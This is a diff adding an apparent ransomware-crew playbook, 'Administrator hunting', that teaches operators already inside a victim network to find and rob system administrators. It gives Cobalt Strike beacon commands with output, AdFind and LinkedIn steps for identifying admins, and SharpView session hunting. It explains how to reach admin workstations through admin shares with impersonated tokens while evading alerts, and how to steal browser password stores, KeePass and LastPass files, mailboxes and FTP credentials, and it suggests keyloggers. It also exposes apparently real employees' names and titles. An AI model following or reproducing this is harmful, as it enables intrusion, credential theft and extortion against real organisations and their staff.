@@ -1,0 +1,431 @@
+```Administrator hunting
+
+If we have servers/NAS/tapes or cloud storages with backups but no access so we need admin credentials 
+So we have to hunt him. Usually there are 1-3 admins on networks we're working on. 
+There are three types:
+
+Senior
+Medium
+Junior
+
+Of course we're insterested in Senior since they have the most previleges/access (passwords).
+
+
+A few options how to determine admin accounts with passwords 
+
+Part 1::
+      Option №1:
+         Examining domain administrator
+
+```
+
+beacon> shell net group "domain admins" /domain
+
+    Tasked beacon to run: net group "domain admins" /domain
+    host called home, sent: 64 bytes
+    received output:
+
+
+La demande sera traitée sur contrôleur de domaine du domaine DOMAIN.com.
+
+Nom de groupe     Domain Admins
+Commentaire       Designated administrators of the domain
+
+Membres
+
+-------------------------------------------------------------------------------
+Administrator            ClusterSvc               createch                 
+Createch2                d01adm                   da9adm                   
+p01adm                   PMPUser                  q01adm                   
+repl                     s01adm                   Sapserviced01           
+SAPServiceDA9            sapservicep01            SAPServiceQ01           
+sapservices01            SAPServiceSND            SAPServiceSOL           
+services                 services2                sndadm                   
+soladm                   somadm                   staseb                   
+telnet                   Johnadm               
+La commande s'est terminée correctement.
+
+```
+
+Filtering service/non-service accounts
+For example, service accounts from the list above are
+```
+SAPServiceDA9
+services
+telnet
+servies2
+Sapservice01
+...
+
+```
+
+Which accounts will MOST LIKELY work:
+```staseb
+Johnadm
+```
+
+Written.
+
+Let's see which accounts are those in adfind_persons.txt
+
+or via command
+```shell net user staseb /domain
+```
+
+Example:
+```
+
+beacon> shell net user ebernardo /domain
+
+    Tasked beacon to run: net user ebernardo /domain
+    host called home, sent: 57 bytes
+    received output:
+
+
+User name                    ebernardo
+Full Name                    Eric Bernardo
+Comment                     
+User's comment               
+Country/region code          (null)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-12-08 12:05:15 PM
+Password expires             2021-06-06 12:05:15 PM
+Password changeable          2020-12-08 12:05:15 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2021-01-29 2:25:24 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Desktop Users
+                             *Server Operators     
+Global Group memberships     *US Users             *Great Plains Users   
+                             *Citrix Group         *VPN Users Saskatoon 
+                             *Admins - AD Basic    *VPNUsersHeadOffice   
+                             *Executives           *All Winnipeg Staff   
+                             *Scribe Console Users *Domain Admins       
+                             *VPN Users USA        *Workstation.admins   
+                             *Domain Users         
+The command completed successfully.
+
+```
+
+So they are a user of dozens groups. Sometimes it's mentioned who they are in Comment section (engineer\system administrator\support\business consultant). Account should be active in Last Logon i.e. today\yesterday\this week but not a year ago or Never.  
+If it is still not possible to identify who they are look at adfind + linkedin (chapter below).
+
+We have 2-3-5 accounts from domain admins and some understanding on who they are. As a result 1-2-3 admin accounts should be found.
+
+
+   Option №2:
+      Analyzing Adfind.
+      We're interested in adfind_groups file
+      Upon opening you'll see walls of text
+      Press Ctrl + F(Notepad2 / Geany)
+      Enter
+      ```dn:CN=
+      ```
+       And press Find All in current document.
+      
+      You should get approximate text (I've cut a bit and left 10-20 rows, usually there are 100-10000 rows)
+      ```
+      
+adfind_groups:3752: dn:CN=SQLServer2005SQLBrowserUser$TRUCAMTLDC,CN=Users,DC=domain,DC=com
+adfind_groups:3775: dn:CN=clubsocial,CN=Users,DC=domain,DC=com
+adfind_groups:3800: dn:CN=Signature Intl-Special,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:3829: dn:CN=FIMSyncAdmins,CN=Users,DC=domain,DC=com
+adfind_groups:3852: dn:CN=GRP-GRAPHISTE,OU=FG-GRP,DC=domain,DC=com
+adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+adfind_groups:3902: dn:CN=MSOL_AD_Sync_RichCoexistence,CN=Users,DC=domain,DC=com
+adfind_groups:3925: dn:CN=WinRMRemoteWMIUsers__,CN=Users,DC=domain,DC=com
+adfind_groups:3946: dn:CN=EDI,CN=Users,DC=domain,DC=com
+adfind_groups:3967: dn:CN=Signature Canada,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:4037: dn:CN=Signature USA,OU=Groupes,OU=Infra,DC=domain,DC=com
+
+      ```
+      
+      So we've extracted active directory groups.
+      We did that because everything in Active Directory of USA/EU networks is structured properly with comments, remarks etc  
+      We're interested in group responsible for IT, administration, LAN engineers 
+      Paste filtered results no notepad and search via key words:
+      ```
+      IT
+      Admin
+      engineer
+      -----
+      ```
+      
+      In our example this row is found:
+      ```
+      adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+      ```
+      
+      Go to row 3877 in adfind_Groups.txt and examine:
+      ```
+      
+dn:CN=IT,CN=Users,DC=domain,DC=com
+>objectClass: top
+>objectClass: group
+>cn: IT
+>description: Informatique
+>member: CN=MS Surface,OU=IT,DC=domain,DC=com
+>member: CN=Gyslain Petit,OU=IT,DC=domain,DC=com
+>member: CN=ftp,CN=Users,DC=domain,DC=com
+>member: CN=St-Amand\, Sebastien\, CDT,OU=IT,DC=domain,DC=com
+```
+
+Skip users ftp and MS Surface, Gyslain Petit and St Amand Sebastien are interesting.
+Open ad_users.txt
+Enter Gyslain Petit
+Find user info:
+```
+
+dn:CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>objectClass: top
+>objectClass: person
+>objectClass: organizationalPerson
+>objectClass: user
+>cn: Gyslain Petit
+>sn: Petit
+>title: Directeur, technologie de l'information
+>physicalDeliveryOfficeName: 217
+>givenName: Gyslain
+>distinguishedName: CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>instanceType: 4
+>whenCreated: 20020323153742.0Z
+>whenChanged: 20201212071143.0Z
+>displayName: Gyslain Petit
+>uSNCreated: 29943
+>memberOf: CN=GRP_Public_USA_P,OU=Securite-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-LDAP-VPN,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=IT Support,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=Directeurs,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-IT,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=Signature Canada,OU=Groupes,OU=Infra,DC=trudeaucorp,DC=com
+>memberOf: CN=EDI,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=IT,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=TRUDEAU-MONTREAL,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=everyone,CN=Users,DC=trudeaucorp,DC=com
+>uSNChanged: 6908986
+>department: IT Manager
+```
+Look at the title. IT director. Great catch but usually IT director won't have passwords, we're interested in System Administrator.
+Do same manipulations on second user.
+Make some notes on who is who and write down adfind logins (sAMAccountname) like this:
+```>sAMAccountName: gpetit
+```
+
+```
+gpetit - IT director
+staseb - position
+```
+
+
+Second part of option №2(easier):
+In adfind_users.txt
+do search
+```title:
+description
+departament
+```
+If lucky you'll have positions straight away. In my case it looks like this:
+
+```
+adfind_persons:280: >title: Responsable, logistique direct import
+adfind_persons:1836: >title: Chef des services techniques
+adfind_persons:1955: >title: Chef comptable
+adfind_persons:4544: >title: Directeur, technologie de l'information
+adfind_persons:6064: >title: Présidente
+adfind_persons:6191: >title: Chargée de projets, mise en marché
+adfind_persons:6285: >title: Directrice marketing
+adfind_persons:6848: >title: Coordonnatrice à la logistique
+adfind_persons:6948: >title: Responsable de l'expedition
+```
+
+Look through the list and you'll find accounts.
+
+
+Those are easy methods. Alternative searches.
+I know only one easy method - linkedin
+Google
+```
+OURVICTIM.COM linkedin
+```
+Insert necessary domain instead of OURVICTIM.COM.
+
+Go to Members
+Search for
+```
+System
+Admin
+Engineer
+Network
+It
+```
+If you were able to find First + Last names, search for them in adfind and you'll get an account.
+If you know about methods which are more effective please write to @rozetka
+
+Part №1 is over.
+
+Time to hunt admin and do analysis
+
+Part №2:
+Do the hunting via SharpView
+Get SharpView.exe from your teamleads in group chat or software chat
+Command:
+On Linux
+```
+execute-assembly /home/user/soft/scripts/SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+On Windows >
+```
+execute-assembly C:\Users\Андрей\Soft\Hacking\SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+
+Where gpetit - user account we're looking for. Paste the data from adfinusers in sAMAccountname.
+
+Log output should look like this:
+
+```
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : DC01.domain.LOCAL
+IPAddress       : 172.16.1.3
+SessionFrom     : 192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : SQL01.domain.LOCAL
+IPAddress       : 172.16.1.30
+SessionFrom     :  192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : lptp-gpetit.domain.LOCAL
+IPAddress       : 172.16.1.40
+SessionFrom     : 192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+```
+
+That's the approximate log format. 
+First of all, software checks where user is authorized at this moment. We have "unordinary" user (administrator) who can be simultaneously authorized on 20-30-50 servers 
+How do we properly filter that?
+First, remove disinterest operating systemms
+For example, first on the list is DC01 which is clearly a DomainController01, you can check it via adfind_computers.txt or by running portscan 172.16.1.13 so you can make sure it's Server OS. We need client's. 
+Second is SQL01 - Database, not interesting.
+Third one is lptp-gpetit. Interesting, our user is gpetit and lptp means laptop.Probably that's him.
+#Sometimes administrator connected ONLY to Server OS but you can see IP address from different subnet (for example, VPN) in SessionFrom column and SharpView didn't "catch" him. Also might be worth working on.
+VERY IMPORTANT
+Noobies trying to create a new session there and OFTEN getting alert. Alert on admin's side means kick from the network, waste of time and nerves. You do NOT do that.
+We gonna be sending requests through file systemю 
+Run
+```shell net view \\172.16.1.40 /ALL
+```
+
+Output lists local drives
+```
+C$
+D$
+```
+Impersonate token (Token is recommended since pth will have a bit different Event ID on domain controller and admin can detect that and kick us from the system)
+
+Open cobalt strike File Manager:
+```\\172.16.1.40\c$
+```
+
+Or use shell
+```
+shell dir \\172.16.1.40\c$```
+
+Quickly look through local drive C:
+Cd to
+```\\172.16.1.40\c$\Users\gpetit
+```
+
+Usually if it IS admin's workstation you can find lots of tools like Virtualbox / putty / winscp etc
+
+Here's the list of interesting directories to look through:
+
+Desktop
+```\\172.16.1.40\c$\Users\gpetit\Desktop
+```
+```
+\\172.16.1.40\c$\Users\gpetit\OneDrive
+\\172.16.1.40\c$\Users\gpetit\Downloads
+\\172.16.1.40\c$\Users\gpetit\Desktop
+\\172.16.1.40\c$\Users\gpetit\Documents
+
+```
+You can extract User configurations directories which are located here:
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local
+```
+
+```\\172.16.1.40\c$\Users\gpetit\AppData\Roaming
+```
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Google\Chrome\User Data\Default
+```
+Google Chrome's History && Login Data are located here.
+History can be downloaded and viewed with DBrowser for SQLite(nix win). Useful since we can check which sites admin visiting, who they're voting for also you can sort by name and even find NAS / Tape / vSphere etc. VERY useful.
+Login Data contains logins and passwords. Encrypted (!). If file size is 38-42kb then it's EMPTY. If file size is bigger than 40-45kb (100kb-1-2Mb) then it contains passwords. If you have URL with password you need - talk to your teamleader.
+Sometimes Login Data contains no password but there's a lastpass file in extensions folder. In this case use RDP at night and export passwords (or use a keylogger or something else)
+You can also check Firefox / Edge folders (paths will be added but you can google them easily)
+
+Also system administrators OFTEN have folders listed below at AppData\Roaming && AppData\Local: 
+
+```Keepass
+LastPass
+```
+Those are their configs. Download those and paste to group conference. If you find those then it's LIKELY they contain a lot of USEFUL passwords.
+
+Sometimes administrator has files like  
+```access.xlsx
+passwords.docx
+```
+on their Desktop
+Downloading, analyzing
+
+Also there is Outlook folder
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local\Microsoft\Outlook
+```
+It contains file like
+```gpetit@domain.com - Exchange1.ost
+```
+It contains MAILS of this dude. Download it and open with free ost viewer to check received/send mail. In some difficult cases it can be useful. 
+Copying is easy - just shut down outlook.exe and copy .ost file then user will start outlook themselves.
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Filezilla
+\\172.16.1.40\c$\Users\gpetit\AppData\Roaming\Filezilla
+```
+File sitemanager.xml can contain FTP SSH credetials. Download, view and send to conference.
+
+
+Also check \\172.16.1.40\C$\ProgramData
++Program files / x86
++ Local drives shown via net view \\host /ALL
+D$ итд
+
+There's also a homeDir at ad_users.txt which is also might be interesting, analyze.
+
+
+Looks like that's it.
+
+Manual was written for those who create a new session and getting administrator alerts.
+Our job is to understand how everything works and not to bruteforce different accesses.
+Everything's already compromised and we just have to analyze it like a real admininstrator. 
+Main objective of administrator hunting is to understand where they have their passwords stored and to download DB\Excel\txt\doc 
